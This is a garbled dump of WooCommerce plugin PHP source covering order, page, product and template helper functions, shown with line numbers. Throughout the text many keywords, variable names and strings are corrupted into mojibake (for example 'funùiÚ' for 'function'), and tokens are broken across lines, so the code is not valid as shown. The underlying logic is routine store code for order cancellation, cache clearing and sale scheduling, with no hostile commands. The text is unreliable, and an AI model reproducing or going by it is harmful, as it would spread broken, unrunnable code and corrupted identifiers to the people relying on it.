Ãw
 
	`WC_Ord”
Ğ
$uÅaid_Üd”
 );

294 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_ÿnûl_uÅaid_Üd”', 
Œue
, 
$Üd”
 ) )

295 
$Üd”
->
	`upd©e_¡©us
Ğ'ÿnûÎed', 
	`__
( 'Unpaid order cancelled -ime†imit„eached.', 'woocommerce' ) );

299 
	`wp_ş—r_scheduËd_hook
( 'woocommerce_cancel_unpaid_orders' );

300 
	`wp_scheduË_sšgË_ev’t
Ğ
	`time
(è+ ( 
	`absšt
Ğ
$h–d_du¿tiÚ
 ) * 60 ), 'woocommerce_cancel_unpaid_orders' );

301 
	}
}

302 
add_aùiÚ
( 'woocommerce_cancel_unpaid_orders', 'wc_cancel_unpaid_orders' );

311 
funùiÚ
 
	$wc_´oûssšg_Üd”_couÁ
() {

312 iàĞ
çl£
 ==ğĞ
$Üd”_couÁ
 = 
	`g‘_Œªs›Á
( 'woocommerce_processing_order_count' ) ) ) {

313 
$Üd”_¡©u£s
 = 
	`g‘_‹rms
( 'shop_order_status' );

314 
$Üd”_couÁ
 = 
çl£
;

315 iàĞ
	`is_¬¿y
Ğ
$Üd”_¡©u£s
 ) ) {

316 
	`fÜ—ch
 ( 
$Üd”_¡©u£s
 
as
 
$¡©us
 ) {

317 iàĞ
$¡©us
->
¦ug
 === 'processing' ) {

318 
$Üd”_couÁ
 +ğ
$¡©us
->
couÁ
;

322 
$Üd”_couÁ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_admš_m’u_couÁ', 
	`štv®
( $order_count ) );

323 
	`£t_Œªs›Á
Ğ'woocomm”û_´oûssšg_Üd”_couÁ', 
$Üd”_couÁ
, 
YEAR_IN_SECONDS
 );

327  
$Üd”_couÁ
;

328 
	}
}

335 
funùiÚ
 
	$wc_d–‘e_shİ_Üd”_Œªs›Ás
Ğ
$po¡_id
 = 0 ) {

336 
glob®
 
$wpdb
;

338 
$po¡_id
 = 
	`absšt
( $post_id );

341 
$Œªs›Ás_to_ş—r
 = 
	`¬¿y
(

346 
$»pÜts
 = 
WC_Admš_R•Üts
::
	`g‘_»pÜts
();

348 
	`fÜ—ch
 ( 
$»pÜts
 
as
 
$»pÜt_group
 ) {

349 
	`fÜ—ch
 ( 
$»pÜt_group
['»pÜts'] 
as
 
$»pÜt_key
 => 
$»pÜt
 ) {

350 
$Œªs›Ás_to_ş—r
[] = 'wc_»pÜt_' . 
$»pÜt_key
;

355 
$Œªs›Ás_to_ş—r
[] = 'wc_admin_report';

358 
	`fÜ—ch
Ğ
$Œªs›Ás_to_ş—r
 
as
 
$Œªs›Á
 ) {

359 
	`d–‘e_Œªs›Á
Ğ
$Œªs›Á
 );

362 
	`do_aùiÚ
Ğ'woocomm”û_d–‘e_shİ_Üd”_Œªs›Ás', 
$po¡_id
 );

363 
	}
}

	@includes/wc-page-functions.php

1 <?
php


19 
funùiÚ
 
	$wc_g‘_·ge_id
Ğ
$·ge
 ) {

21 iàĞ
$·ge
 == 'pay' || $page == 'thanks' ) {

22 
	`_d•»ÿ‹d_¬gum’t
Ğ
__FUNCTION__
, '2.1', 'The "pay"‡nd "thanks"…ages‡re‚o-longer used -‡nƒndpoint is‡ddedohe checkout instead. To get‡ valid†ink usehe WC_Order::get_checkout_payment_url() or WC_Order::get_checkout_order_received_url() methods instead.' );

24 
$·ge
 = 'checkout';

26 iàĞ
$·ge
 == 'change_password' || $page == 'edit_address' || $page == 'lost_password' ) {

27 
	`_d•»ÿ‹d_¬gum’t
Ğ
__FUNCTION__
, '2.1', 'The "change_password", "edit_address"‡nd "lost_password"…ages‡re‚o-longer used -‡nƒndpoint is‡ddedohe my-account instead. To get‡ valid†ink usehe wc_customer_edit_account_url() function instead.' );

29 
$·ge
 = 'myaccount';

32 
$·ge
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_' . $·g. '_·ge_id', 
	`g‘_İtiÚ
('woocommerce_' . $page . '_page_id' ) );

34  
$·ge
 ? $page : -1;

35 
	}
}

45 
funùiÚ
 
wc_g‘_’dpošt_u¾
Ğ
$’dpošt
, 
$v®ue
 = '', 
$³rm®šk
 = '' ) {

46 iàĞ! 
$³rm®šk
 )

47 
$³rm®šk
 = 
g‘_³rm®šk
();

50 
	g$’dpošt
 = 
is£t
Ğ
WC
()->
qu”y
->
qu”y_v¬s
[ 
$’dpošt
 ] ) ? WC()->query->query_vars[ $endpoint ] : $endpoint;

52 iàĞ
g‘_İtiÚ
( 'permalink_structure' ) ) {

53 iàĞ
¡r¡r
Ğ
$³rm®šk
, '?' ) ) {

54 
	g$qu”y_¡ršg
 = '?' . 
·r£_u¾
Ğ
$³rm®šk
, 
PHP_URL_QUERY
 );

55 
	g$³rm®šk
 = 
cu¼’t
Ğ
ex¶ode
Ğ'?', 
$³rm®šk
 ) );

57 
	g$qu”y_¡ršg
 = '';

59 
	g$u¾
 = 
Œašg¦ash™
Ğ
$³rm®šk
 ) . 
$’dpošt
 . '/' . 
$v®ue
 . 
$qu”y_¡ršg
;

61 
	g$u¾
 = 
add_qu”y_¬g
Ğ
$’dpošt
, 
$v®ue
, 
$³rm®šk
 );

64  
­¶y_f‹rs
Ğ'woocomm”û_g‘_’dpošt_u¾', 
$u¾
 );

74 
funùiÚ
 
	$wc_lo¡·sswÜd_u¾
() {

75  
	`wc_g‘_’dpošt_u¾
Ğ'lo¡-·sswÜd', '', 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

76 
	}
}

77 
add_f‹r
( 'lostpassword_url', 'wc_lostpassword_url', 10, 0 );

85 
funùiÚ
 
	$wc_cu¡om”_ed™_accouÁ_u¾
() {

86 
$ed™_accouÁ_u¾
 = 
	`wc_g‘_’dpošt_u¾
Ğ'ed™-accouÁ', '', 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

88  
	`­¶y_f‹rs
Ğ'woocomm”û_cu¡om”_ed™_accouÁ_u¾', 
$ed™_accouÁ_u¾
 );

89 
	}
}

98 
funùiÚ
 
	$wc_Çv_m’u_™ems
Ğ
$™ems
, 
$¬gs
 ) {

99 iàĞ! 
	`is_u£r_logged_š
() ) {

101 
$hide_·ges
 = 
	`¬¿y
();

102 
$hide_·ges
[] = (è
	`wc_g‘_·ge_id
( 'logout' );

103 
$hide_·ges
 = 
	`­¶y_f‹rs
( 'woocommerce_logged_out_hidden_page_ids', $hide_pages );

105 
	`fÜ—ch
 ( 
$™ems
 
as
 
$key
 => 
$™em
 ) {

106 iàĞ
	`¡r¡r
Ğ
$™em
->
u¾
, 'customer-logout' ) )

107 
	`un£t
Ğ
$™ems
[ 
$key
 ] );

110  
$™ems
;

111 
	}
}

112 
add_f‹r
( 'wp_nav_menu_objects', 'wc_nav_menu_items', 10, 2 );

122 
funùiÚ
 
	$wc_Çv_m’u_™em_şas£s
Ğ
$m’u_™ems
, 
$¬gs
 ) {

124 iàĞ! 
	`is_woocomm”û
(èè 
$m’u_™ems
;

126 
$shİ_·ge
 = (è
	`wc_g‘_·ge_id
('shop');

127 
$·ge_fÜ_po¡s
 = (è
	`g‘_İtiÚ
( 'page_for_posts' );

129 
	`fÜ—ch
 ( (
¬¿y
è
$m’u_™ems
 
as
 
$key
 => 
$m’u_™em
 ) {

131 
$şas£s
 = (
¬¿y
è
$m’u_™em
->
şas£s
;

134 iàĞ
$·ge_fÜ_po¡s
 =ğ
$m’u_™em
->
objeù_id
 ) {

135 
$m’u_™ems
[
$key
]->
cu¼’t
 = 
çl£
;

137 iàĞ
	`š_¬¿y
Ğ'cu¼’t_·ge_·»Á', 
$şas£s
 ) )

138 
	`un£t
Ğ
$şas£s
[ 
	`¬¿y_£¬ch
('current_page_parent', $classes) ] );

140 iàĞ
	`š_¬¿y
Ğ'cu¼’t-m’u-™em', 
$şas£s
 ) )

141 
	`un£t
Ğ
$şas£s
[ 
	`¬¿y_£¬ch
('current-menu-item', $classes) ] );

144 } 
	`–£if
 ( 
	`is_shİ
(è&& 
$shİ_·ge
 =ğ
$m’u_™em
->
objeù_id
 ) {

145 
$m’u_™ems
[
$key
]->
cu¼’t
 = 
Œue
;

146 
$şas£s
[] = 'current-menu-item';

147 
$şas£s
[] = 'current_page_item';

150 } 
	`–£if
 ( 
	`is_sšguÏr
Ğ'´oduù' ) && 
$shİ_·ge
 =ğ
$m’u_™em
->
objeù_id
 ) {

151 
$şas£s
[] = 'current_page_parent';

154 
$m’u_™ems
[
$key
]->
şas£s
 = 
	`¬¿y_unique
Ğ
$şas£s
 );

158  
$m’u_™ems
;

159 
	}
}

160 
add_f‹r
( 'wp_nav_menu_objects', 'wc_nav_menu_item_classes', 2, 20 );

172 
funùiÚ
 
	$wc_li¡_·ges
Ğ
$·ges
 ) {

173 
glob®
 
$po¡
;

175 ià(
	`is_woocomm”û
()) {

176 
$·ges
 = 
	`¡r_»¶aû
( 'current_page_parent', '', $pages);

177 
$shİ_·ge
 = '·ge-™em-' . 
	`wc_g‘_·ge_id
('shop');

179 ià(
	`is_shİ
()) :

180 
$·ges
 = 
	`¡r_»¶aû
(
$shİ_·ge
, $shop_page . ' current_page_item', $pages);

182 
$·ges
 = 
	`¡r_»¶aû
(
$shİ_·ge
, $shop_page . ' current_page_parent', $pages);

183 
’dif
;

185  
$·ges
;

186 
	}
}

187 
add_f‹r
( 'wp_list_pages', 'wc_list_pages' );

	@includes/wc-product-functions.php

1 <?
php


20 
funùiÚ
 
g‘_´oduù
Ğ
$the_´oduù
 = 
çl£
, 
$¬gs
 = 
	$¬¿y
() ) {

21  
	`WC
()->
´oduù_çùÜy
->
	`g‘_´oduù
Ğ
$the_´oduù
, 
$¬gs
 );

22 
	}
}

30 
funùiÚ
 
	$wc_upd©e_´oduù_¡ock
Ğ
$´oduù_id
, 
$Ãw_¡ock_Ëv–
 ) {

31 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

33 iàĞ
$´oduù
->
	`is_ty³
( 'variation' ) )

34 
$´oduù
->
	`£t_¡ock
Ğ
$Ãw_¡ock_Ëv–
, 
Œue
 );

36 
$´oduù
->
	`£t_¡ock
Ğ
$Ãw_¡ock_Ëv–
 );

37 
	}
}

45 
funùiÚ
 
	$wc_upd©e_´oduù_¡ock_¡©us
Ğ
$´oduù_id
, 
$¡©us
 ) {

46 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

47 
$´oduù
-> 
	`£t_¡ock_¡©us
Ğ
$¡©us
 );

48 
	}
}

54 
funùiÚ
 
	$wc_´oduù_sku_’abËd
() {

55  
	`­¶y_f‹rs
Ğ'wc_´oduù_sku_’abËd', 
Œue
 );

56 
	}
}

62 
funùiÚ
 
	$wc_´oduù_weight_’abËd
() {

63  
	`­¶y_f‹rs
Ğ'wc_´oduù_weight_’abËd', 
Œue
 );

64 
	}
}

70 
funùiÚ
 
	$wc_´oduù_dim’siÚs_’abËd
() {

71  
	`­¶y_f‹rs
Ğ'wc_´oduù_dim’siÚs_’abËd', 
Œue
 );

72 
	}
}

79 
funùiÚ
 
	$wc_d–‘e_´oduù_Œªs›Ás
Ğ
$po¡_id
 = 0 ) {

80 
glob®
 
$wpdb
;

82 iàĞ
	`wp_usšg_ext_objeù_ÿche
() ) {

83 
	`wp_ÿche_æush
();

87 
$po¡_id
 = 
	`absšt
( $post_id );

90 
$Œªs›Ás_to_ş—r
 = 
	`¬¿y
(

100 
$wpdb
->
	`qu”y
( "DELETE FROM `$wpdb->options` WHERE `option_name` LIKE ('_transient_wc_uf_pid_%') OR `option_name` LIKE ('_transient_timeout_wc_uf_pid_%')" );

101 
$wpdb
->
	`qu”y
( "DELETE FROM `$wpdb->options` WHERE `option_name` LIKE ('_transient_wc_ln_count_%') OR `option_name` LIKE ('_transient_timeout_wc_ln_count_%')" );

102 
$wpdb
->
	`qu”y
( "DELETE FROM `$wpdb->options` WHERE `option_name` LIKE ('_transient_wc_ship_%') OR `option_name` LIKE ('_transient_timeout_wc_ship_%')" );

103 
$wpdb
->
	`qu”y
( "DELETE FROM `$wpdb->options` WHERE `option_name` LIKE ('_transient_wc_products_will_display_%') OR `option_name` LIKE ('_transient_timeout_wc_products_will_display_%')" );

106 
$po¡_Œªs›Á_Çmes
 = 
	`¬¿y
(

113 iàĞ
$po¡_id
 > 0 ) {

114 
	`fÜ—ch
Ğ
$po¡_Œªs›Á_Çmes
 
as
 
$Œªs›Á
 ) {

115 
$Œªs›Ás_to_ş—r
[] = 
$Œªs›Á
 . 
$po¡_id
;

118 
	`fÜ—ch
Ğ
$po¡_Œªs›Á_Çmes
 
as
 
$Œªs›Á
 ) {

119 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM `$wpdb->İtiÚs` WHERE `İtiÚ_Çme` LIKE % OR `İtiÚ_Çme` LIKE %s", '_Œªs›Á_' . 
$Œªs›Á
 . '%', '_transient_timeout_' . $transient . '%' ) );

124 
	`fÜ—ch
Ğ
$Œªs›Ás_to_ş—r
 
as
 
$Œªs›Á
 ) {

125 
	`d–‘e_Œªs›Á
Ğ
$Œªs›Á
 );

128 
	`do_aùiÚ
Ğ'woocomm”û_d–‘e_´oduù_Œªs›Ás', 
$po¡_id
 );

129 
	}
}

138 
funùiÚ
 
	$wc_g‘_´oduù_ids_Ú_§Ë
() {

139 
glob®
 
$wpdb
;

142 
$´oduù_ids_Ú_§Ë
 = 
	`g‘_Œªs›Á
( 'wc_products_onsale' );

145 iàĞ
çl£
 !=ğ
$´oduù_ids_Ú_§Ë
 )

146  
$´oduù_ids_Ú_§Ë
;

148 
$Ú_§Ë_po¡s
 = 
$wpdb
->
	`g‘_»suÉs
( "

149 
SELECT
 
po¡
.
ID
,…o¡.
po¡_·»Á
 
FROM
 `
$wpdb
->
po¡s
` 
AS
…ost

150 
LEFT
 
JOIN
 `
$wpdb
->
po¡m‘a
` 
AS
 
m‘a
 
ON
 
po¡
.
ID
 = m‘a.
po¡_id


151 
LEFT
 
JOIN
 `
$wpdb
->
po¡m‘a
` 
AS
 
m‘a2
 
ON
 
po¡
.
ID
 = m‘a2.
po¡_id


152 
WHERE
 
po¡
.
po¡_ty³
 
	`IN
 ( 'product', 'product_variation' )

153 
AND
 
po¡
.
po¡_¡©us
 = 'publish'

154 
AND
 
m‘a
.
m‘a_key
 = '_sale_price'

155 
AND
 
m‘a2
.
m‘a_key
 = '_price'

156 
AND
 
	`CAST
Ğ
m‘a
.
m‘a_v®ue
 
AS
 
DECIMAL
 ) >= 0

157 
AND
 
	`CAST
Ğ
m‘a
.
m‘a_v®ue
 
AS
 
CHAR
 ) != ''

158 
AND
 
	`CAST
Ğ
m‘a
.
m‘a_v®ue
 
AS
 
DECIMAL
 ) = CASTĞ
m‘a2
.meta_value AS DECIMAL )

159 
GROUP
 
BY
 
po¡
.
ID
;

162 
$´oduù_ids_Ú_§Ë
 = 
	`¬¿y_unique
Ğ
	`¬¿y_m­
Ğ'absšt', 
	`¬¿y_m”ge
Ğ
	`wp_li¡_¶uck
Ğ
$Ú_§Ë_po¡s
, 'ID' ), 
	`¬¿y_diff
Ğwp_li¡_¶uckĞ$Ú_§Ë_po¡s, 'po¡_·»Á' ), 
	`¬¿y
( 0 ) ) ) ) );

164 
	`£t_Œªs›Á
Ğ'wc_´oduùs_Ú§Ë', 
$´oduù_ids_Ú_§Ë
, 
YEAR_IN_SECONDS
 );

166  
$´oduù_ids_Ú_§Ë
;

167 
	}
}

176 
funùiÚ
 
	$wc_g‘_ã©u»d_´oduù_ids
() {

179 
$ã©u»d_´oduù_ids
 = 
	`g‘_Œªs›Á
( 'wc_featured_products' );

182 iàĞ
çl£
 !=ğ
$ã©u»d_´oduù_ids
 )

183  
$ã©u»d_´oduù_ids
;

185 
$ã©u»d
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

186 'po¡_ty³' => 
	`¬¿y
( 'product', 'product_variation' ),

189 'm‘a_qu”y' => 
	`¬¿y
(

190 
	`¬¿y
(

192 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

195 
	`¬¿y
(

203 
$´oduù_ids
 = 
	`¬¿y_keys
Ğ
$ã©u»d
 );

204 
$·»Á_ids
 = 
	`¬¿y_v®ues
Ğ
$ã©u»d
 );

205 
$ã©u»d_´oduù_ids
 = 
	`¬¿y_unique
Ğ
	`¬¿y_m”ge
Ğ
$´oduù_ids
, 
$·»Á_ids
 ) );

207 
	`£t_Œªs›Á
Ğ'wc_ã©u»d_´oduùs', 
$ã©u»d_´oduù_ids
, 
YEAR_IN_SECONDS
 );

209  
$ã©u»d_´oduù_ids
;

210 
	}
}

220 
funùiÚ
 
	$wc_´oduù_po¡_ty³_lšk
Ğ
$³rm®šk
, 
$po¡
 ) {

222 iàĞ
$po¡
->
po¡_ty³
 !== 'product' )

223  
$³rm®šk
;

226 iàĞ
çl£
 ==ğ
	`¡½os
Ğ
$³rm®šk
, '%' ) )

227  
$³rm®šk
;

230 
$‹rms
 = 
	`g‘_the_‹rms
Ğ
$po¡
->
ID
, 'product_cat' );

232 iàĞ
	`em±y
Ğ
$‹rms
 ) ) {

234 
$´oduù_ÿt
 = 
	`_x
( 'uncategorized', 'slug', 'woocommerce' );

237 
$fœ¡_‹rm
 = 
	`¬¿y_shiá
Ğ
$‹rms
 );

238 
$´oduù_ÿt
 = 
$fœ¡_‹rm
->
¦ug
;

241 
$fšd
 = 
	`¬¿y
(

253 
$»¶aû
 = 
	`¬¿y
(

254 
	`d©e_i18n
Ğ'Y', 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ),

255 
	`d©e_i18n
Ğ'm', 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ),

256 
	`d©e_i18n
Ğ'd', 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ),

257 
	`d©e_i18n
Ğ'H', 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ),

258 
	`d©e_i18n
Ğ'i', 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ),

259 
	`d©e_i18n
Ğ's', 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e
 ) ),

260 
$po¡
->
ID
,

261 
$´oduù_ÿt
,

262 
$´oduù_ÿt


265 
$»¶aû
 = 
	`¬¿y_m­
( 'sanitize_title', $replace );

267 
$³rm®šk
 = 
	`¡r_»¶aû
Ğ
$fšd
, 
$»¶aû
, $permalink );

269  
$³rm®šk
;

270 
	}
}

271 
add_f‹r
( 'post_type_link', 'wc_product_post_type_link', 10, 2 );

280 
funùiÚ
 
	$wc_¶aûhŞd”_img_¤c
() {

281  
	`­¶y_f‹rs
Ğ'woocomm”û_¶aûhŞd”_img_¤c', 
	`WC
()->
	`¶ugš_u¾
() . '/assets/images/placeholder.png' );

282 
	}
}

290 
funùiÚ
 
wc_¶aûhŞd”_img
Ğ
$size
 = 'shop_thumbnail' ) {

291 
$dim’siÚs
 = 
wc_g‘_image_size
Ğ
$size
 );

293  
­¶y_f‹rs
('woocomm”û_¶aûhŞd”_img', '<img src="' . 
wc_¶aûhŞd”_img_¤c
(è. '"‡É="PÏûhŞd”" width="' . 
esc_©Œ
Ğ
$dim’siÚs
['width'] ) . '" class="woocommerce-placeholder wp-post-image" height="' .ƒsc_attr( $dimensions['height'] ) . '" />' );

306 
funùiÚ
 
wc_g‘_fÜm©‹d_v¬ŸtiÚ
Ğ
$v¬ŸtiÚ
 = '', 
$æ©
 = 
çl£
 ) {

307 
$»tuº
 = '';

309 iàĞ
is_¬¿y
Ğ
$v¬ŸtiÚ
 ) ) {

311 iàĞ! 
	g$æ©
 ) {

312 
	g$»tuº
 = '<dl class="variation">';

315 
	g$v¬ŸtiÚ_li¡
 = 
¬¿y
();

317 
fÜ—ch
 ( 
$v¬ŸtiÚ
 
as
 
$Çme
 => 
$v®ue
 ) {

318 iàĞ! 
$v®ue
 ) {

323 iàĞ
xÚomy_exi¡s
Ğ
esc_©Œ
Ğ
¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ) ) ) {

324 
	g$‹rm
 = 
g‘_‹rm_by
Ğ'¦ug', 
$v®ue
, 
esc_©Œ
Ğ
¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ) );

325 iàĞ! 
is_wp_”rÜ
Ğ
$‹rm
 ) && 
	g$‹rm
->
	gÇme
 )

326 
	g$v®ue
 = 
$‹rm
->
Çme
;

329 iàĞ
	g$æ©
 ) {

330 
	g$v¬ŸtiÚ_li¡
[] = 
wc_©Œibu‹_Ïb–
Ğ
¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ) . ': ' . 
u¾decode
Ğ
$v®ue
 );

332 
	g$v¬ŸtiÚ_li¡
[] = '<dt>' . 
wc_©Œibu‹_Ïb–
Ğ
¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ) . ':</dt><dd>' . 
u¾decode
Ğ
$v®ue
 ) . '</dd>';

336 iàĞ
	g$æ©
 ) {

337 
	g$»tuº
 .ğ
im¶ode
Ğ', ', 
$v¬ŸtiÚ_li¡
 );

339 
	g$»tuº
 .ğ
im¶ode
Ğ'', 
$v¬ŸtiÚ_li¡
 );

342 iàĞ! 
	g$æ©
 ) {

343 
	g$»tuº
 .= '</dl>';

346  
	g$»tuº
;

355 
funùiÚ
 
	$wc_scheduËd_§Ës
() {

356 
glob®
 
$wpdb
;

359 
$´oduù_ids
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
( "

360 
SELECT
 
po¡m‘a
.
po¡_id
 
FROM
 {
$wpdb
->po¡m‘a} 
as
…ostmeta

361 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
as
 
po¡m‘a_2
 
ON
…o¡m‘a.
po¡_id
 =…ostmeta_2.post_id

362 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
as
 
po¡m‘a_3
 
ON
…o¡m‘a.
po¡_id
 =…ostmeta_3.post_id

363 
WHERE
 
po¡m‘a
.
m‘a_key
 = '_sale_price_dates_from'

364 
AND
 
po¡m‘a_2
.
m‘a_key
 = '_price'

365 
AND
 
po¡m‘a_3
.
m‘a_key
 = '_sale_price'

366 
AND
 
po¡m‘a
.
m‘a_v®ue
 > 0

367 
AND
 
po¡m‘a
.
m‘a_v®ue
 < %
s


368 
AND
 
po¡m‘a_2
.
m‘a_v®ue
 !ğ
po¡m‘a_3
.meta_value

371 iàĞ
$´oduù_ids
 ) {

372 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

373 
$§Ë_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$´oduù_id
, '_§Ë_´iû', 
Œue
 );

375 iàĞ
$§Ë_´iû
 ) {

376 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_´iû', 
$§Ë_´iû
 );

379 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_sale_price_dates_from', '' );

380 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_sale_price_dates_to', '' );

383 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$´oduù_id
 );

385 
$·»Á
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$´oduù_id
 );

388 iàĞ
$·»Á
 ) {

390 
	`d–‘e_po¡_m‘a
Ğ
$·»Á
, '_min_price_variation_id' );

393 
$this_´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

394 iàĞ
$this_´oduù
->
	`is_ty³
( 'simple' ) )

395 
$this_´oduù
->
	`grou³d_´oduù_sync
();

397 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$·»Á
 );

403 
$´oduù_ids
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
( "

404 
SELECT
 
po¡m‘a
.
po¡_id
 
FROM
 {
$wpdb
->po¡m‘a} 
as
…ostmeta

405 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
as
 
po¡m‘a_2
 
ON
…o¡m‘a.
po¡_id
 =…ostmeta_2.post_id

406 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
as
 
po¡m‘a_3
 
ON
…o¡m‘a.
po¡_id
 =…ostmeta_3.post_id

407 
WHERE
 
po¡m‘a
.
m‘a_key
 = '_sale_price_dates_to'

408 
AND
 
po¡m‘a_2
.
m‘a_key
 = '_price'

409 
AND
 
po¡m‘a_3
.
m‘a_key
 = '_regular_price'

410 
AND
 
po¡m‘a
.
m‘a_v®ue
 > 0

411 
AND
 
po¡m‘a
.
m‘a_v®ue
 < %
s


412 
AND
 
po¡m‘a_2
.
m‘a_v®ue
 !ğ
po¡m‘a_3
.meta_value

415 iàĞ
$´oduù_ids
 ) {

416 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

417 
$»guÏr_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$´oduù_id
, '_»guÏr_´iû', 
Œue
 );

419 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_´iû', 
$»guÏr_´iû
 );

420 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_sale_price', '' );

421 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_sale_price_dates_from', '' );

422 
	`upd©e_po¡_m‘a
Ğ
$´oduù_id
, '_sale_price_dates_to', '' );

424 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$´oduù_id
 );

426 
$·»Á
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$´oduù_id
 );

429 iàĞ
$·»Á
 ) {

431 
	`d–‘e_po¡_m‘a
Ğ
$·»Á
, '_min_variation_price' );

434 
$this_´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

435 iàĞ
$this_´oduù
->
	`is_ty³
( 'simple' ) )

436 
$this_´oduù
->
	`grou³d_´oduù_sync
();

438 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$·»Á
 );

442 
	}
}

443 
add_aùiÚ
( 'woocommerce_scheduled_sales', 'wc_scheduled_sales' );

452 
funùiÚ
 
	$wc_g‘_©chm’t_image_©Œibu‹s
Ğ
$©Œ
 ) {

453 iàĞ
	`¡r¡r
Ğ
$©Œ
['src'], 'woocommerce_uploads/' ) )

454 
$©Œ
['¤c'] = 
	`wc_¶aûhŞd”_img_¤c
();

456  
$©Œ
;

457 
	}
}

458 
add_f‹r
( 'wp_get_attachment_image_attributes', 'wc_get_attachment_image_attributes' );

468 
funùiÚ
 
	$wc_´•¬e_©chm’t_fÜ_js
Ğ
$»¥Ú£
 ) {

470 iàĞ
	`is£t
Ğ
$»¥Ú£
['u¾'] ) && 
	`¡r¡r
( $response['url'], 'woocommerce_uploads/' ) ) {

471 
$»¥Ú£
['fuÎ']['u¾'] = 
	`wc_¶aûhŞd”_img_¤c
();

472 iàĞ
	`is£t
Ğ
$»¥Ú£
['sizes'] ) ) {

473 
	`fÜ—ch
Ğ
$»¥Ú£
['sizes'] 
as
 
$size
 => 
$v®ue
 ) {

474 
$»¥Ú£
['sizes'][ 
$size
 ]['u¾'] = 
	`wc_¶aûhŞd”_img_¤c
();

479  
$»¥Ú£
;

480 
	}
}

481 
add_f‹r
( 'wp_prepare_attachment_for_js', 'wc_prepare_attachment_for_js' );

486 
funùiÚ
 
	$wc_Œack_´oduù_v›w
() {

487 iàĞ! 
	`is_sšguÏr
( 'product' ) )

490 
glob®
 
$po¡
, 
$´oduù
;

492 iàĞ
	`em±y
Ğ
$_COOKIE
['woocommerce_recently_viewed'] ) )

493 
$v›wed_´oduùs
 = 
	`¬¿y
();

495 
$v›wed_´oduùs
 = (
¬¿y
è
	`ex¶ode
Ğ'|', 
$_COOKIE
['woocommerce_recently_viewed'] );

497 iàĞ! 
	`š_¬¿y
Ğ
$po¡
->
ID
, 
$v›wed_´oduùs
 ) )

498 
$v›wed_´oduùs
[] = 
$po¡
->
ID
;

500 iàĞĞ
$v›wed_´oduùs
 ) > 15 )

501 
	`¬¿y_shiá
Ğ
$v›wed_´oduùs
 );

504 
	`wc_£tcook›
Ğ'woocomm”û_»ûÁly_v›wed', 
	`im¶ode
Ğ'|', 
$v›wed_´oduùs
 ) );

505 
	}
}

507 
add_aùiÚ
( 'template_redirect', 'wc_track_product_view', 20 );

	@includes/wc-template-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

20 
funùiÚ
 
	$wc_‹m¶©e_»dœeù
() {

21 
glob®
 
$wp_qu”y
, 
$wp
;

24 iàĞ! 
	`em±y
Ğ
$_GET
['·ge_id'] ) && 
	`g‘_İtiÚ
Ğ'³rm®šk_¡ruùu»' ) =ğ"" && $_GET['·ge_id'] =ğ
	`wc_g‘_·ge_id
( 'shop' ) ) {

25 
	`wp_§ã_»dœeù
Ğ
	`g‘_po¡_ty³_¬chive_lšk
('product') );

26 
ex™
;

30 
	`–£if
 ( 
	`is_·ge
Ğ
	`wc_g‘_·ge_id
Ğ'checkout' ) ) && Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(èè=ğ0 && 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['Üd”-·y'] ) && ! 
	`is£t
( $wp->query_vars['order-received'] ) ) {

31 
	`wp_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'cart' ) ) );

32 
ex™
;

36 
	`–£if
 ( 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['customer-logout'] ) ) {

37 
	`wp_»dœeù
Ğ
	`¡r_»¶aû
Ğ'&amp;', '&', 
	`wp_logout_u¾
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
